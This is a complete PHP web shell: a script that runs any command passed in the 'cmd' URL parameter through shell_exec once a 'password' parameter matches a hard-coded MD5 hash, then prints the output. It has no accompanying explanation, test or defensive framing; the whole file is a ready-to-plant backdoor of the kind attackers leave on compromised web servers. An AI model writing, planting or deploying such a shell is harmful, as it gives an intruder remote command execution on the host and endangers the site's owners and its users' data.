<?php
function auth($password)
{
    $input_password_hash = md5($password);
    return (strcmp('e4a25f7b052442a076b02ee9a1818d2e', $input_password_hash) == 0);
}
if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
    if (auth($_GET['password'])) {
        $output = shell_exec($_GET['cmd']);
        $output = rtrim($output);
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    } else {
        die('Access revoked!');
    }
}
?>
 